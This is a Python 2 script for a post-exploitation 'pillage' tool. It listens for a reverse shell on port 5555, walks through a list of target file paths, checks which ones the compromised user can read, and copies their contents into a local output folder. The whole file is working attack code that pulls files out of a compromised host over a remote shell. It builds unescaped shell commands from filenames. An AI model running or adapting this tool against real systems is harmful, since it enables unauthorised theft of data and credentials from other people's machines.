import os
from connector import connector

PURPLE = '\033[95m'
BLUE = '\033[94m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
ORANGE = '\033[48;5;95;38;5;214m'
WHITE = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'

def green(str):
    return GREEN + str + WHITE

def red(str):
    return RED + str + WHITE

def purple(str):
    return PURPLE + str + WHITE


class Pillage():

    def __init__(self, target, output_dir=None):
        self.target = target
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
        output_dir = os.path.join(output_dir, target.name())
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
        self.output_dir = output_dir

    def test_read_permission(self, filename):
        user = self.target.exec_cmd('whoami').strip()
        cmd = 'find %s -user %s -type f -perm -u+r' % (filename, user)
        return self.target.exec_cmd(cmd)

    def get_file_content(self, filename):
        cmd = '[ -f %s ] && cat %s' % (filename, filename)
        filename = os.path.normpath(filename).replace('/', '_')
        result_file = os.path.join(self.output_dir, filename)
        with open(result_file, "w") as f:
            f.write(self.target.exec_cmd(cmd))
        return result_file

    def get_file(self, filename):
        cmd = '[ -f "%s" ] && ls -l "%s"' % (filename, filename)
        result = self.target.exec_cmd(cmd)
        if not result:
            print red(filename)
            return False
        permission = self.test_read_permission(filename)
        if permission:
            result_file = self.get_file_content(filename)
            print green(filename + ' => ' + result_file)
        else:
            print purple(filename + ' => Permission denied')
        return True


    def start(self, pillage_list):
        result_file = os.path.join(self.output_dir, 'files_found')
        print 'Looking for files from %s...' % pillage_list
        with open(result_file, "w") as fresult:
            with open(pillage_list, "r") as f:
                results = 0
                for line in f:
                    filename = line.strip()
                    if self.get_file(filename):
                        fresult.write(filename+"\n")
                        results += 1
        print '%d files found on system' % results

# target = connector.Local()
target = connector.ReverseShell(5555)
output_dir = 'output'
pillage = Pillage(target, output_dir )
pillage_list = 'pillage.lst'

pillage.start(pillage_list)

#while(1):
#    print target.ask_cmd()
